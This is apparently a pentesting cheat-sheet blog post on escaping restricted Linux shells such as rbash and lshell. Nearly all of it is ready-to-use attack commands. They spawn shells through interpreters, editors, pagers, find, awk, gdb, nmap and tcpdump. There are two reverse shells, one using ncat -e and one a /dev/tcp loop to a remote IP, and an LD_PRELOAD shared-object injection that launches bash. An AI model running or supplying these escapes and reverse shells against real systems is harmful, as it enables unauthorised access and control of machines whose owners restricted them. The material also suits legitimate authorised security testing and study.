---
title: Linux - Restricted environments
date: 2024-08-03 11:00:00
categories:
  - Pentesting
  - Linux
tags:
  - Pentesting
  - Linux
  - restricted environment
toc: true
---

---
Escape restricted Linux environments.

---
<!-- more -->

## List of restricted environments
```bash
rbash
rsh
rksh
rzsh
lshell
```

<br>

## Environment reconnaissance
```bash See exported environment variables
env
```
```bash Find the PATH
echo $PATH
```
```bash View the shell used
echo $SHELL
echo $0
```
```bash View available commands in /usr/bin
ls -lasR /usr/bin
```
```bash Check the availability of a command
type -a command
type -a ls
```
```bash Can you use '/'?
/bin/sh
```
```bash Can you set env variables?
export PATH=/bin:/usr/bin:$PATH
export SHELL=/bin/sh
```
```bash Can you copy files into existing PATH?
cp /bin/sh /dir/inside/PATH; sh
```
```bash List available commands
compgen -c
```

<br>

## Use built-in shells
```bash
# Attempt to spawn a bash shell
/bin/bash
bash -i
exec /bin/bash

# If bash is restricted, try sh
/bin/sh

# If neither works, try other common shells
python -c 'import pty; pty.spawn("/bin/bash")'
perl -e 'exec "/bin/sh";'
ruby -e 'exec "/bin/sh"'
php -r 'system("/bin/bash");'
php -r 'shell_exec("/bin/bash");'
php -a # interactive shell
```

<br>

## Use SSH for remote access
```bash Try to SSH to localhost
ssh user@localhost
```
```bash Replace shell with a new one running as login shell
ssh user@$IP -t "bash -l"
```
```bash Start bash without sourcing ~/.bashrc or ~/.bash_profile
ssh user@$IP -t "bash --noprofile"
```

<br>

## Use text editors
```bash
vim -c ':!/bin/sh'
vi -c ':!/bin/sh'
```
```bash
nano # (Ctrl+R, Ctrl+X)
/bin/sh
```
```bash
ed
:!bash
```

<br>

## Using `less`, `more` and `man`
```bash
less /etc/hosts
!bash
```
```bash
more /etc/hosts
!bash
```
```bash
man
!sh
```

<br>

## Use other utilities
```bash rev shell
ncat -e /bin/bash $IP $port
```
```bash
find . -exec /bin/sh \;
```
```bash
nmap --interactive
!sh
```
```bash
awk 'BEGIN {system("/bin/bash")}'
```
```bash
tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /bin/sh -Z root
```
```bash
ftp
!/bin/sh
```
```bash
gdb
!/bin/sh
```
```bash
gdb -p $$
!/bin/sh
```
```bash
scp -S /tmp/exit.sh x y:
```
```bash Use SUID binaries - passwd for example
passwd -r compat -s
```

<br>

## More options
```bash Create symlink
ln -sf /bin/bash restricted_shell
```
```bash Write to files
echo "evil code" | tee script.sh
```
```bash rev shell
# On restricted shell
nc -lvp 4444
# On local machine
/bin/bash -c 'exec 5<>/dev/tcp/$remote_ip/4444;cat <&5 | while read line; do $line 2>&5 >&5; done'
```
```bash 
stty raw -echo; fg; export SHELL=/bin/bash; export TERM=xterm-256color; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp; stty rows 52 columns 208; reset;
```

<br>

Create a custom library
1. Create a shared object
```c /tmp/inject.c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("/bin/bash");
}
```
2. Compile the code
```bash
gcc -fPIC -shared -o /tmp/libinject.so /tmp/inject.c
```
3. Run the restricted binary with LD_PRELOAD binary
```bash
export LD_PRELOAD=/tmp/libinject.so
restricted_binary
```

<br>

---
---